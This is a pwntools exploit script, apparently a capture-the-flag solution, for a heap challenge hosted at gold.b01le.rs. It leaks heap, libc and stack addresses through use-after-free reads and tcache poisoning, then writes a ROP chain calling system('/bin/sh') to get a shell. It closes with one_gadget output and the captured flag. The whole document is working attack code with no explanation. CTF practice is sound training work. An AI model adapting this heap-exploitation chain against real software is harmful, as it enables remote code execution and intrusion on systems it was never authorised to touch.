#!/usr/bin/python3

from pwn import *

exe = ELF('chal_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x153C

        c
        ''')
        input()


if args.REMOTE:
    p = remote('gold.b01le.rs', 4001)
else:
    p = process(exe.path)


def cr(idx, size=0x70):
    sla(b'-----Resize----', str(1))
    sla(b"? ", str(idx))
    sla(b"? ", str(size))


def de(idx):
    sla(b'-----Resize----', str(2))
    sla(b"? ", str(idx))


def vi(idx):
    sla(b'-----Resize----', str(3))
    sla(b"? ", str(idx))


def ed(idx, size, pa):
    sla(b'-----Resize----', str(4))
    sla(b"? ", str(idx))
    sla(b"? ", str(size))
    sleep(1)
    s(pa)


cr(0)
cr(1)
de(0)
de(1)
vi(1)
heap = u64(p.recvline(keepends=False) + b'\0\0') - 0x260
info("heap: " + hex(heap))

cr(2, 0x500)
cr(3, 0x10)
de(2)
vi(2)
libc.address = u64(p.recvline(keepends=False) + b'\0\0') - 0x3afca0
info("libc.address " + hex(libc.address))

target = libc.sym.environ
ed(1, 0x70*2, flat(target))
cr(0)
cr(1)
vi(1)
stack = u64(p.recvline(keepends=False) + b'\0\0')
info("libc.address " + hex(stack))
GDB()

cr(0, 0x60)
cr(1, 0x60)
de(0)
de(1)
target = stack - 0x120 -8 
pop_rdi = 0x000000000002154d + libc.address
ed(1, 0x70*2, flat(target))
cr(0, 0x60)
cr(1, 0x60)
ed(1, 0x70*2, flat(0, pop_rdi+1, pop_rdi, next(libc.search(b'/bin/sh')), libc.sym.system))
p.interactive()
'''
0x41602 execve("/bin/sh", rsp+0x30, environ)
constraints:
  address rsp+0x40 is writable
  rax == NULL || {rax, "-c", r12, NULL} is a valid argv

0x41656 execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv

0xdeec2 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
'''
# bctf{j33z_1_d1dn7_kn0w_h34p_1z_s0_easy}